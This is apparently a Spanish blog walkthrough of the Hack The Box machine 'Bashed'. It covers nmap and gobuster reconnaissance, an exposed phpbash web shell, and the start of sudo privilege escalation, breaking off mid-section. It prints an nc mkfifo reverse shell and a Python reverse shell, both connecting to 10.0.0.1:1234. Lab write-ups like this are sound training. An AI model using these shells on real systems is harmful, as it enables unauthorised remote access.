---
title: Hack The Box - Bashed
date: 2020-08-06 07:49:00 Z
---

Siguiente la antesala de los anteriores posts, hoy seguimos con **BASHED**

![Bashed.jpg]({{site.baseurl}}/images/Bashed/Bashed.jpg)

El primer paso, como siempre, comprobar si tenemos conectividad entre nuestro equipo y "víctima".

![Ping.jpg]({{site.baseurl}}/images/Bashed/Ping.jpg)

Gracias al [TTL](https://es.wikipedia.org/wiki/Tiempo_de_vida_(inform%C3%A1tica)) reconocemos que la máquina que vamos a auditar es una máquina **Linux**.

# Reconocimiento

Como siempre, ejecutamos la herramienta **NMAP**

En esta ocasión, haremos uso de un análisis agresivo, pero siempre trabajando en entornos controlados, como es mi caso, sin problema.

Tenemos dos principales parámetros:

* **A**: Enable OS detection, version detection, script scanning, and traceroute.

* **T5**: Acelera el proceso, podemos indicar del 1 al 5, siendo 5 el más rapido.

```
nmap -A -T5 10.10.10.68 -p-                                                                              
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 03:51 EDT                                                            
Warning: 10.10.10.68 giving up on port because retransmission cap hit (2).                                                 
Nmap scan report for 10.10.10.68                                                                                           
Host is up (0.035s latency).                                                                                               
Not shown: 57774 closed ports, 7759 filtered ports           
PORT     STATE SERVICE    VERSION                 
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)                
|_http-title: Arrexel's Development Site                    
4480/tcp open  tcpwrapped
```

Reconocemos un equipo Ubuntu que corre un servidor web Apache con la versión **2.4.18**.

Si accedemos al servidor web, nos encontramos la siguiente web.

![web.jpg]({{site.baseurl}}/images/Bashed/web.jpg)

Nos hace referencia a [**este**](https://github.com/Arrexel/phpbash) repositorio.

```
phpbash is a standalone, semi-interactive web shell. 
It's main purpose is to assist in penetration tests where traditional reverse shells are not possible. 
The design is based on the default Kali Linux terminal colors, so pentesters should feel right at home.
```

Recogeremos más información con la herramienta **gobuster**.

![gobuster.jpg]({{site.baseurl}}/images/Bashed/gobuster.jpg)


# Análisis

Con la herramienta **gobuster**, hemos podido recolectar información del servidor web, obteniendo directorios accesibles.

Es interanse comprender el **Status** que tienen.

Podemos observar multiples **directorios** que son **accesibles**, reciben los códigos:
* **200**, los códigos que empiezan por la cifra 2, son **respuestas satisfactorias**.
* **301**, los códigos que empiezan por la cifra 3, son **reedirecciones**.

Podemos leer y aprender más sobre los códigos webs a través de está [página](https://developer.mozilla.org/es/docs/Web/HTTP/Status).

# Explotación

Accediendo a los directios que nos ha descubierto gobuster, nos encontramos con el directorio **/dev/**.

El cuál contiene, las **webshell´s** del repositorio que hemos leído anteriormente.

![dev.jpg]({{site.baseurl}}/images/Bashed/dev.jpg)

En estás webshell, podemos ejecutar todo tipo de comandos.

![webshell.jpg]({{site.baseurl}}/images/Bashed/webshell.jpg)

El objetivo que nos hemos marcado, será tener una shell totalmente interactiva, desde nuestra propia máquina.

Para ello necesitaremos lanzar una shell reversa hacía nuestra máquina.

El primer paso, debemos levantar un puerto desde nuestro equipo y mantenerlo a la escucha.

![puertoescucha.jpg]({{site.baseurl}}/images/Bashed/puertoescucha.jpg)

Y desde la webshell, lanzaremos un netcat.

![netcat-e.jpg]({{site.baseurl}}/images/Bashed/netcat-e.jpg)

Primero hemos comprobado si el binario se encuentra instalado, afirmativo, así lo es.

Y segundo, lanzamos la reverse shell, pero en este caso, nos da error debido a que la opción **-e** la cuál indicamos que **ejecute** un **/bin/sh**, no se encuentra instalada.

Probamos otra opción, que es hacer uso de netcat pero sin la opción -e.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

Y tampoco llega a producirse la conexión.

Usaremos esta con **python**:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Y obtenemos la reverse shell!**

![shell.jpg]({{site.baseurl}}/images/Bashed/shell.jpg)

Ahora podremos agarrar la flag de user.txt


![falguser.jpg]({{site.baseurl}}/images/Bashed/falguser.jpg)


# PostExplotación

Empezamos con la fase de escalada de privilegios.

Si listamos los permisos de sudo:

![sudo-ll.jpg]({{site.baseurl}}/images/Bashed/sudo-ll.jpg)

Podemos ver que tenemos permisos para **ejecutar comandos** con el usuario scriptmanager.

Otra pista sería ver los procesos que están corriendo con el comando:

`ps -aux`

![psauz.jpg]({{site.baseurl}}/images/Bashed/psauz.jpg)

De esta forma podemos **ejecutar comandos** y abrirnos una **bash** con el usuario scriptmanager.

![sudo-i-u.jpg]({{site.baseurl}}/images/Bashed/sudo-i-u.jpg)

En la **raíz del sistema** nos encontramos un **directorio** que resulta ser interesante.

![directorio.jpg]({{site.baseurl}}/images/Bashed/directorio.jpg)



Resulta interesante y  si víamos anteriormente los procesos corriendo, nos llamaría la atención que hay una tarea programada que se ejecuta.


